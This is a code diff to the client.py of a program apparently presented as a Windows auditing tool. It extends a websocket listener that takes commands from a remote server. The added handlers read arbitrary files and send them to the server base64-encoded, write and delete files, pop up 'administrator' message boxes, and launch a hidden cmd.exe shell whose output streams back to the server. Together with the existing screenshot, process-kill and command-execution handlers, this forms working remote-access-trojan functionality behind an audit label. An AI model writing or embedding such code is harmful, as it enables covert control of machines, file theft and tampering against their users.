@@ -223,8 +223,11 @@ def run_full_audit_sync():
 
 # FILE: client.py
 
+terminal_process = None
+
 async def listen_for_remote_commands(websocket):
     """Lắng nghe các lệnh điều khiển từ xa từ server."""
+    global terminal_process
     try:
         async for message in websocket:
             try:
@@ -232,32 +235,148 @@ async def listen_for_remote_commands(websocket):
                 if data.get('type') == 'remote_command':
                     command_type = data.get('command')
                     print(f"[REMOTE] Received command: {command_type}")
-                    
+
                     response_data = {"type": "remote_response", "command": command_type, "guid": CLIENT_GUID}
-                    
+
+                    import base64
+                    import ctypes
+                    import threading
+                    import subprocess
+                    import asyncio
+
                     if command_type == 'terminal':
                         cmd = data.get('payload', '')
                         shell = data.get('shell', 'cmd')
                         result = WindowsAuditor._RemoteControl.execute_command(cmd, shell)
                         response_data["result"] = result
-                        
+                        await websocket.send(json.dumps(response_data))
+
                     elif command_type == 'process_list':
                         response_data["result"] = WindowsAuditor._RemoteControl.get_process_list()
-                        
+                        await websocket.send(json.dumps(response_data))
+
                     elif command_type == 'kill_process':
                         pid = data.get('payload')
                         success = WindowsAuditor._RemoteControl.kill_process(int(pid))
                         response_data["result"] = {"success": success}
-                        
+                        await websocket.send(json.dumps(response_data))
+
                     elif command_type == 'screenshot':
                         img_b64 = WindowsAuditor._RemoteControl.take_screenshot()
                         response_data["result"] = {"image": img_b64}
-                        
+                        await websocket.send(json.dumps(response_data))
+
                     elif command_type == 'file_browse':
                         path = data.get('payload', '')
                         response_data["result"] = WindowsAuditor._RemoteControl.list_dir(path)
-                    
-                    await websocket.send(json.dumps(response_data))
+                        await websocket.send(json.dumps(response_data))
+
+                    elif command_type == 'file_download':
+                        filepath = data.get('payload', '')
+                        try:
+                            with open(filepath, 'rb') as f:
+                                file_data = f.read()
+                            b64_data = base64.b64encode(file_data).decode('utf-8')
+                            response_data["result"] = {
+                                "success": True,
+                                "filename": os.path.basename(filepath),
+                                "content": b64_data
+                            }
+                        except Exception as e:
+                            response_data["result"] = {"success": False, "error": str(e)}
+                        await websocket.send(json.dumps(response_data))
+
+                    elif command_type == 'file_upload':
+                        payload = data.get('payload', {})
+                        filepath = payload.get('path', '')
+                        b64_content = payload.get('content', '')
+                        try:
+                            file_data = base64.b64decode(b64_content)
+                            with open(filepath, 'wb') as f:
+                                f.write(file_data)
+                            response_data["result"] = {"success": True}
+                        except Exception as e:
+                            response_data["result"] = {"success": False, "error": str(e)}
+                        await websocket.send(json.dumps(response_data))
+
+                    elif command_type == 'file_delete':
+                        filepath = data.get('payload', '')
+                        try:
+                            os.remove(filepath)
+                            response_data["result"] = {"success": True}
+                        except Exception as e:
+                            response_data["result"] = {"success": False, "error": str(e)}
+                        await websocket.send(json.dumps(response_data))
+
+                    elif command_type == 'message_box':
+                        message_text = data.get('payload', '')
+                        try:
+                            def show_msg():
+                                ctypes.windll.user32.MessageBoxW(0, message_text, "Message from Administrator", 0x40 | 0x0)
+                            threading.Thread(target=show_msg, daemon=True).start()
+                            response_data["result"] = {"success": True}
+                        except Exception as e:
+                            response_data["result"] = {"success": False, "error": str(e)}
+                        await websocket.send(json.dumps(response_data))
+
+                    elif command_type == 'terminal_start':
+                        if terminal_process and terminal_process.poll() is None:
+                            try: terminal_process.terminate()
+                            except: pass
+                        shell = data.get('payload', 'cmd.exe')
+                        flags = getattr(subprocess, 'CREATE_NO_WINDOW', 0)
+                        try:
+                            terminal_process = subprocess.Popen(
+                                shell,
+                                stdin=subprocess.PIPE,
+                                stdout=subprocess.PIPE,
+                                stderr=subprocess.STDOUT,
+                                text=True,
+                                bufsize=0,
+                                creationflags=flags
+                            )
+                            def read_output(proc, ws, loop):
+                                try:
+                                    while proc.poll() is None:
+                                        char = proc.stdout.read(1)
+                                        if not char:
+                                            break
+                                        asyncio.run_coroutine_threadsafe(
+                                            ws.send(json.dumps({
+                                                "type": "remote_response",
+                                                "command": "terminal_stream",
+                                                "guid": CLIENT_GUID,
+                                                "result": {"output": char}
+                                            })),
+                                            loop
+                                        )
+                                except: pass
+                            loop = asyncio.get_event_loop()
+                            threading.Thread(target=read_output, args=(terminal_process, websocket, loop), daemon=True).start()
+                            response_data["result"] = {"success": True}
+                        except Exception as e:
+                            response_data["result"] = {"success": False, "error": str(e)}
+                        await websocket.send(json.dumps(response_data))
+
+                    elif command_type == 'terminal_input':
+                        if terminal_process and terminal_process.poll() is None:
+                            input_data = data.get('payload', '')
+                            terminal_process.stdin.write(input_data)
+                            terminal_process.stdin.flush()
+                        else:
+                            response_data["result"] = {"error": "Terminal not running"}
+                            await websocket.send(json.dumps(response_data))
+
+                    elif command_type == 'terminal_stop':
+                        if terminal_process:
+                            try:
+                                terminal_process.terminate()
+                                terminal_process.wait(timeout=2)
+                            except: pass
+                            terminal_process = None
+                        response_data["result"] = {"success": True}
+                        await websocket.send(json.dumps(response_data))
+
                     print(f"[REMOTE] Sent response for {command_type}")
             except Exception as e:
                 print(f"[REMOTE] Error processing message: {e}")
